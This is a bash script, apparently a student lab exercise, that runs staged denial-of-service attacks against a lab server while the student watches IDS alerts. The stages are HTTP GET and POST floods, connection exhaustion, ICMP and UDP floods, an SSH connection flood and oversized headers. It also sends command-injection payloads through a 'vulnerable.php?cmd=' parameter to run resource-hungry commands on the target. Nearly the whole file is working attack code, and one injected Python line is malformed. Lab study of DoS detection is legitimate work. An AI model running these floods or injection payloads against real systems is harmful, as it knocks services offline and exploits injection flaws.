#!/bin/bash

# Ethical Hacking Lab - DoS (Denial of Service) Testing Script
# Target: 192.168.56.10 (Victim Server)
# Author: Student Lab Exercise
# Date: $(date)

echo "=============================================="
echo "⚡ ETHICAL HACKING LAB - DoS TESTING PHASE"
echo "=============================================="
echo "Target Server: 192.168.56.10"
echo "Target Services: HTTP (80), SSH (22)"
echo "Attacker (This machine): $(hostname -I)"
echo "Start Time: $(date)"
echo "=============================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

TARGET="192.168.56.10"

# Function to pause and wait for user input
pause_for_monitoring() {
    echo -e "${YELLOW}⏸️  PAUSE: Check your IDS alerts now! Press Enter to continue...${NC}"
    read -p ""
}

# Function to check if target is still responsive
check_target_status() {
    echo "🔍 Checking target status..."
    ping -c 2 $TARGET > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Target is responsive to ping${NC}"
    else
        echo -e "${RED}❌ Target is not responding to ping${NC}"
    fi
    
    curl -s --connect-timeout 5 http://$TARGET/ > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Web service is responsive${NC}"
    else
        echo -e "${RED}❌ Web service is not responding${NC}"
    fi
}

echo -e "${BLUE}📍 Phase 1: HTTP Flood Attack${NC}"
echo "----------------------------------------------"

echo "⚡ Step 1.1: Baseline - Normal HTTP Request"
curl -s -w "Time: %{time_total}s\n" http://$TARGET/ > /dev/null
pause_for_monitoring

echo "⚡ Step 1.2: Rapid HTTP Requests (Moderate)"
echo "Sending 50 rapid requests..."
for i in {1..50}; do
    curl -s http://$TARGET/ > /dev/null &
    if [ $((i % 10)) -eq 0 ]; then
        echo "Sent $i requests..."
        sleep 0.1
    fi
done
wait
check_target_status
pause_for_monitoring

echo "⚡ Step 1.3: HTTP POST Flood"
echo "Sending 30 POST requests with large data..."
for i in {1..30}; do
    curl -s -X POST -d "data=$(head -c 10000 /dev/zero | tr '\0' 'A')" http://$TARGET/vulnerable.php > /dev/null &
    if [ $((i % 10)) -eq 0 ]; then
        echo "Sent $i POST requests..."
        sleep 0.2
    fi
done
wait
check_target_status
pause_for_monitoring

echo -e "${BLUE}📍 Phase 2: Connection Exhaustion${NC}"
echo "----------------------------------------------"

echo "⚡ Step 2.1: TCP SYN Flood Simulation"
echo "Opening multiple connections..."
for i in {1..20}; do
    (telnet $TARGET 80 > /dev/null 2>&1 &) 
    sleep 0.1
done
check_target_status
pause_for_monitoring

echo "⚡ Step 2.2: HTTP Keep-Alive Exhaustion"
echo "Creating persistent connections..."
for i in {1..15}; do
    (curl -s --keepalive-time 60 http://$TARGET/ > /dev/null &)
    sleep 0.2
done
check_target_status
pause_for_monitoring

echo -e "${BLUE}📍 Phase 3: Application-Level DoS${NC}"
echo "----------------------------------------------"

echo "⚡ Step 3.1: Command Injection DoS"
echo "Executing resource-intensive commands..."
curl -s "http://$TARGET/vulnerable.php?cmd=find / -name '*' 2>/dev/null" > /dev/null &
curl -s "http://$TARGET/vulnerable.php?cmd=dd if=/dev/zero of=/tmp/test bs=1M count=100 2>/dev/null" > /dev/null &
curl -s "http://$TARGET/vulnerable.php?cmd=yes > /tmp/cpu_test &" > /dev/null &
sleep 5
curl -s "http://$TARGET/vulnerable.php?cmd=pkill yes" > /dev/null
check_target_status
pause_for_monitoring

echo "⚡ Step 3.2: Memory Exhaustion Attempt"
echo "Attempting to consume server memory..."
curl -s "http://$TARGET/vulnerable.php?cmd=python3 -c 'x=[]'; while True: x.append(' '*10000000)" > /dev/null &
PYTHON_PID=$!
sleep 3
kill $PYTHON_PID 2>/dev/null
check_target_status
pause_for_monitoring

echo -e "${BLUE}📍 Phase 4: Network Layer DoS${NC}"
echo "----------------------------------------------"

echo "⚡ Step 4.1: ICMP Flood"
echo "Sending ICMP flood..."
ping -f -c 100 $TARGET > /dev/null 2>&1 &
PING_PID=$!
sleep 10
kill $PING_PID 2>/dev/null
check_target_status
pause_for_monitoring

echo "⚡ Step 4.2: UDP Flood"
echo "Sending UDP packets..."
for i in {1..100}; do
    echo "UDP_FLOOD_TEST_$i" | nc -u $TARGET 1234 2>/dev/null &
done
sleep 5
check_target_status
pause_for_monitoring

echo -e "${BLUE}📍 Phase 5: Service-Specific Attacks${NC}"
echo "----------------------------------------------"

echo "⚡ Step 5.1: SSH Connection Flood"
echo "Attempting multiple SSH connections..."
for i in {1..10}; do
    (timeout 5 ssh -o ConnectTimeout=2 invalid_user@$TARGET 2>/dev/null &)
    sleep 0.1
done
check_target_status
pause_for_monitoring

echo "⚡ Step 5.2: HTTP Header DoS"
echo "Sending malformed HTTP headers..."
for i in {1..20}; do
    (echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nUser-Agent: $(head -c 5000 /dev/zero | tr '\0' 'A')\r\n\r\n" | nc $TARGET 80 > /dev/null 2>&1 &)
    sleep 0.1
done
check_target_status
pause_for_monitoring

echo -e "${BLUE}📍 Phase 6: Recovery Testing${NC}"
echo "----------------------------------------------"

echo "⚡ Step 6.1: Cleanup and Recovery Check"
echo "Cleaning up processes and testing recovery..."
pkill -f "curl"
pkill -f "nc"
pkill -f "telnet"
sleep 5

echo "⚡ Step 6.2: Final Status Check"
check_target_status
sleep 10

echo "⚡ Step 6.3: Service Recovery Verification"
for i in {1..5}; do
    echo "Recovery test $i/5..."
    curl -s -w "Response time: %{time_total}s\n" http://$TARGET/ | head -1
    sleep 2
done

echo "=============================================="
echo -e "${GREEN}✅ DoS TESTING PHASE COMPLETE${NC}"
echo "=============================================="
echo "End Time: $(date)"
echo ""
echo -e "${YELLOW}📋 SUMMARY OF DoS ATTACKS PERFORMED:${NC}"
echo "• HTTP Flood - Multiple request patterns"
echo "• Connection Exhaustion - TCP and Keep-Alive"
echo "• Application DoS - Command injection based"
echo "• Network Layer - ICMP and UDP floods"
echo "• Service-Specific - SSH and HTTP header attacks"
echo "• Recovery Testing - Service resilience check"
echo ""
echo -e "${YELLOW}📋 NEXT STEPS:${NC}"
echo "1. Review IDS alerts for DoS detection patterns"
echo "2. Check system resources on victim server"
echo "3. Document service availability during attacks"
echo "4. Analyze attack effectiveness and IDS response"
echo ""
echo -e "${RED}⚠️  IMPORTANT: Monitor victim server resources!${NC}"
echo -e "${RED}⚠️  This is for educational purposes only!${NC}"
echo "=============================================="
